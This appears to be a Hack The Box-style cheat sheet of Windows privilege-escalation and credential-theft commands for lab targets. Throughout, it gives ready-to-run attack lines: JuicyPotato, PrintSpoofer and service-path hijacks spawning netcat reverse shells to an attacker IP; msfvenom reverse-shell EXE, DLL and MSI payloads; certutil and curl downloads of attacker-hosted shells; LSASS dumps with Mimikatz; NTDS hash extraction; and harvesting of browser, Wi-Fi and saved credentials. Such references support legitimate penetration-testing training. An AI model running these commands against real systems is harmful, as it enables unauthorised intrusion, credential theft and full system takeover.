## Initial Enumeration

RDP to lab target

```
xfreerdp /v:<target ip> /u:htb-student
```

Get interface, IP address and DNS information

```
ipconfig /all
```

Review ARP table

```
arp -a
```

Review routing table

```
route print
```

Check Windows Defender status

```
Get-MpComputerStatus
```

List AppLocker rules

```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

Test AppLocker policy

```
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```

Display all environment variables

```
set
```

View detailed system configuration information

```
systeminfo
```

Get patches and updates

```
wmic qfe
```

Get installed programs

```
wmic product get name
```

Display running processes

```
tasklist /svc
```

Get logged-in users

```
query user
```

Get current user

```
echo %USERNAME%
```

View current user privileges

```
whoami /priv
```

View current user group information

```
whoami /groups
```

Get all system users

```
net user
```

Get all system groups

```
net localgroup
```

View details about a group

```
net localgroup administrators
```

Get passsword policy

```
net accounts
```

Display active network connections

```
netstat -ano
```

List named pipes

```
pipelist.exe /accepteula
```

List named pipes with PowerShell

```
gci \\.\pipe\
```

Review permissions on a named pipe

```
accesschk.exe /accepteula \\.\Pipe\lsass -v
```

## Handy Commands

Connect using mssqlclient.py

```
mssqlclient.py sql_dev@10.129.43.30 -windows-auth
```

Enable xp_cmdshell with mssqlclient.py

```
enable_xp_cmdshell
```

Run OS commands with xp_cmdshell

```
xp_cmdshell whoami
```

Escalate privileges with JuicyPotato

```
c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 443 -e cmd.exe" -t *
```

Escalating privileges with PrintSpoofer

```
c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```

Take memory dump with ProcDump

```
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

Use MimiKatz to extract credentials from LSASS memory dump

```
sekurlsa::minidump lsass.dmp` and `sekurlsa::logonpasswords
```

Checking ownership of a file

```
dir /q C:\backups\wwwroot\web.config
```

Taking ownership of a file

```
takeown /f C:\backups\wwwroot\web.config
```

Confirming changed ownership of a file

```
Get-ChildItem -Path ‘C:\backups\wwwroot\web.config’ | select name,directory, @{Name=“Owner”;Expression={(Ge t-ACL $_.Fullname).Owner}}
```

Modifying a file ACL

```
icacls “C:\backups\wwwroot\web.config” /grant htb-student:F
```

Extract hashes with secretsdump.py

```
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

Copy files with ROBOCOPY

```
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```

Searching security event logs

```
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```

Passing credentials to wevtutil

```
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```

Searching event logs with PowerShell

```
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*' } | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```

Generate malicious DLL

```
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

Loading a custom DLL with dnscmd

```
dnscmd.exe /config /serverlevelplugindll adduser.dll
```

Finding a user's SID

```
wmic useraccount where name="netadm" get sid
```

Checking permissions on DNS service

```
sc.exe sdshow DNS
```

Stopping a service

```
sc stop dns
```

Starting a service

```
sc start dns
```

Querying a registry key

```
reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
```

Deleting a registry key

```
reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll
```

Checking a service status

```
sc query dns
```

Disabling the global query block list

```
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```

Adding a WPAD record

```
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```

Compile with cl.exe

```
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
```

Add reference to a driver (1)

```
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
```

Add reference to a driver (2)

```
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```

Check if driver is loaded

```
.\DriverView.exe /stext drivers.txt` and `cat drivers.txt | Select-String -pattern Capcom
```

Using EopLoadDriver

```
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
```

Checking service permissions with PsService

```
c:\Tools\PsService.exe security AppReadiness
```

Modifying a service binary path

```
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```

Confirming UAC is enabled

```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```

Checking UAC level

```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```

Checking Windows version

```
[environment]::OSVersion.Version
```

Reviewing path variable

```
cmd /c echo %PATH%
```

Downloading file with cURL in PowerShell

```
curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
```

Executing custom dll with rundll32.exe

```
rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```

Running SharpUp

```
.\SharpUp.exe audit
```

Checking service permissions with icacls

```
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

Replace a service binary

```
cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

Searching for unquoted service paths

```
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

Checking for weak service ACLs in the Registry

```
accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
```

Changing ImagePath with PowerShell

```
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```

Check startup programs

```
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```

Generating a malicious binary

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe
```

Enumerating a process ID with PowerShell

```
get-process -Id 3324
```

Enumerate a running service by name with PowerShell

```
get-service | ? {$_.DisplayName -like 'Druva*'}
```

## Credential Theft

Search for files with the phrase "password"

```
findstr /SIM /C:"password" *.txt *ini *.cfg *.config *.xml
```

Searching for passwords in Chrome dictionary files

```
gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```

Confirm PowerShell history save path

```
(Get-PSReadLineOption).HistorySavePath
```

Reading PowerShell history file

```
gc (Get-PSReadLineOption).HistorySavePath
```

Decrypting PowerShell credentials

```
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
```

Searching file contents for a string

```
cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt
```

Searching file contents for a string

```
findstr /si password *.xml *.ini *.txt *.config
```

Searching file contents for a string

```
findstr /spin "password" *.*
```

Search file contents with PowerShell

```
select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password
```

Search for file extensions

```
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
```

Search for file extensions

```
where /R C:\ *.config
```

Search for file extensions using PowerShell

```
Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
```

List saved credentials

```
cmdkey /list
```

Retrieve saved Chrome credentials

```
.\SharpChrome.exe logins /unprotect
```

View LaZagne help menu

```
.\lazagne.exe -h
```

Run all LaZagne modules

```
.\lazagne.exe all
```

Running SessionGopher

```
Invoke-SessionGopher -Target WINLPE-SRV01
```

View saved wireless networks

```
netsh wlan show profile
```

Retrieve saved wireless passwords

```
netsh wlan show profile ilfreight_corp key=clear
```

## Other Commands

Transfer file with certutil

```
certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
```

Encode file with certutil

```
certutil -encode file1 encodedfile
```

Decode file with certutil

```
certutil -decode encodedfile file2
```

Query for always install elevated registry key (1)

```
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
```

Query for always install elevated registry key (2)

```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

Generate a malicious MSI package

```
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
```

Executing an MSI package from command line

```
msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
```

Enumerate scheduled tasks

```
schtasks /query /fo LIST /v
```

Enumerate scheduled tasks with PowerShell

```
Get-ScheduledTask | select TaskName,State
```

Check permissions on a directory

```
.\accesschk64.exe /accepteula -s -d C:\Scripts\
```

Check local user description field

```
Get-LocalUser
```

Enumerate computer description field

```
Get-WmiObject -Class Win32_OperatingSystem | select Description
```

Mount VMDK on Linux

```
guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmd
```

Mount VHD/VHDX on Linux

```
guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1
```

Update Windows Exploit Suggester database

```
sudo python2.7 windows-exploit-suggester.py  --update
```

Running Windows Exploit Suggester

```
python2.7 windows-exploit-suggester.py  --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt
```
